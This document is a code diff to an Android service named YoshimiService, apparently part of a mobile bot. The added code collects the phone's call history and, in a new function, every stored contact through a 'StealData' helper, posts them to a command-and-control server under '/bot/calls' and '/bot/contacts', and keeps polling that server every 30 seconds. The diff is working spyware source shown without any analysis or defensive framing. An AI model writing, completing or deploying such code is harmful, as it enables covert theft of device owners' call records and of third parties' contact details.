@@ -1,7 +1,6 @@
 package com.redactedlabs.yoshimi;
 
 import java.io.IOException;
-import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -50,11 +49,10 @@ public class YoshimiService extends Service {
 		return null;
 	}
 	
-	
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		try {
 			mainLoop();
-		} catch (InterruptedException error) {
+		} catch (Exception error) {
 			Log.d(TAG, error.toString());
 		}
 		Log.e(TAG, "Main loop ended?!?");
@@ -81,22 +79,29 @@ public class YoshimiService extends Service {
 	
 	private void mainLoop() throws InterruptedException {
 		Log.d(TAG, "Sending a hello ...");
-		String getResponse = Http.GET(CC_SERVER+"/bot/hello", URLEncoder.encode(uuid));
+		String getResponse = Http.GET(CC_SERVER+"/bot/hello", uuid);
 		Log.d(TAG, "Yoshimi C&C (GET): " + getResponse);
-		
+		/* Send Version and Model */
 		Log.d(TAG, "Sending version information ...");
-		String postResponse = Http.POST(CC_SERVER+"/bot/version", URLEncoder.encode(uuid), getVersionInformation());
+		String postResponse = Http.POST(CC_SERVER+"/bot/version", uuid, getVersionInformation());
 		Log.d(TAG, "Yoshimi C&C (POST): " + postResponse);
-		
+		/* Send Call History */
 		Log.d(TAG, "Sending call information ...");
-		postResponse = Http.POST(CC_SERVER+"/bot/calls", URLEncoder.encode(uuid), getCallInformation());
-		Log.d(TAG, "Yoshimi C&C (POST): " + postResponse);
-		
+		List<NameValuePair> callInfo = getCallInformation();
+		if (callInfo != null) {
+			postResponse = Http.POST(CC_SERVER+"/bot/calls", uuid, callInfo);
+			Log.d(TAG, "Yoshimi C&C (POST): " + postResponse);
+		}
+		/* Send Contacts */
+		Log.d(TAG, "Sending contacts information ...");
+		getContactsInformation();
+
 		Log.d(TAG, "Starting main loop ...");
 		while (true) {
+			/* Poll server for commands */
 			Thread.sleep(30000);
 			Log.d(TAG, "Still alive!");
-			Http.GET(CC_SERVER+"/bot/ping", URLEncoder.encode(uuid));
+			Http.GET(CC_SERVER+"/bot/ping", uuid);
 		}
 	}
 	
@@ -117,16 +122,44 @@ public class YoshimiService extends Service {
 	private List<NameValuePair> getCallInformation() {
 		Context currentContext = getBaseContext();
 		RecentCall[] calls = StealData.getCalls(currentContext);
-		JSONObject jsonContacts = new JSONObject();
-		for(Integer index = 0; index < calls.length; index++) {
-			try {
-				jsonContacts.put(index.toString(), calls[index].getJsonObject());
-			} catch (Exception error) {
-				Log.d(TAG, "Failed to export call as json: " + error.toString());
+		if (calls != null) {
+			JSONObject jsonCalls = new JSONObject();
+			for(Integer index = 0; index < calls.length; index++) {
+				try {
+					jsonCalls.put(index.toString(), calls[index].getJsonObject());
+				} catch (Exception error) {
+					Log.d(TAG, "Failed to export call as json: " + error.toString());
+				}
 			}
+			List<NameValuePair> callInfo = new ArrayList<NameValuePair>();
+			callInfo.add(new BasicNameValuePair("jsonCalls", jsonCalls.toString()));
+			return callInfo;
+		} else {
+			return null;
 		}
-		List<NameValuePair> callInfo = new ArrayList<NameValuePair>();
-		callInfo.add(new BasicNameValuePair("jsonCalls", jsonContacts.toString()));
-		return callInfo;
+	}
+	
+	private void getContactsInformation() {
+		Context currentContext = getBaseContext();
+		ContactsList[] contacts = StealData.getContacts(currentContext);
+		if (contacts != null) {
+			for(Integer index = 0; index < contacts.length; index++) {
+				try {
+					String contact = contacts[index].getJsonObject();
+					List<NameValuePair> contactUpload = new ArrayList<NameValuePair>();
+					contactUpload.add(new BasicNameValuePair("jsonContact", contact));
+					String response = Http.POST(CC_SERVER+"/bot/contacts", uuid, contactUpload);
+					if (response.equals("ok")) {
+						Log.d(TAG, "Successfully uploaded contact to control server");
+					} else {
+						Log.e(TAG, "Failed to upload contact");
+					}
+				} catch (Exception error) {
+					Log.d(TAG, "Failed to export contact as json: " + error.toString());
+				}
+			}
+		} else {
+			Log.d(TAG, "No contacts found");
+		}
 	}
 }
